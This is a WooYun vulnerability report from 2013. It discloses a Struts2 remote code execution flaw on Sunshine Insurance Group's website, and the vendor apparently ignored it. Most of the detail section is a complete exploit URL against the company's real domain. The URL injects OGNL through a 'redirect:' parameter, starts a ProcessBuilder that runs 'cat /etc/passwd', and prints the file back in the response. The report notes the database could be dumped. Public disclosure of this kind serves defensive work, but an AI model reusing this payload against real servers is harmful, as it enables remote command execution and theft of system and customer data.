wybug_title: 阳光保险集团struts2远程执行漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2013-07-18：	积极联系厂商并且等待厂商认领中，细节不对外公开									2013-09-01：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 可拖库 详细说明：  http://www.sinosig.com/preinsu_get.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]%20%20{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20%20%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%20%20%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%20%20%23matt.getWriter%28%29.close%28%29}   漏洞证明：

wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
